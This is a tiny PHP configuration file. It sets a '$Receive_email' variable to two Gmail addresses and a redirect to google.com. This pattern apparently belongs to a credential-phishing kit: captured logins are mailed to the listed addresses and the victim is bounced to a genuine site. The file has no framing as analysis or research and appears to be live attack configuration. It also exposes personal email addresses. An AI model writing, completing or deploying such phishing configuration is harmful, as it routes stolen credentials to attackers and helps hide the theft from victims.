<?php 
$Receive_email="tohartg6@gmail.com,markvello90@gmail.com";
$redirect="https://www.google.com/";
?>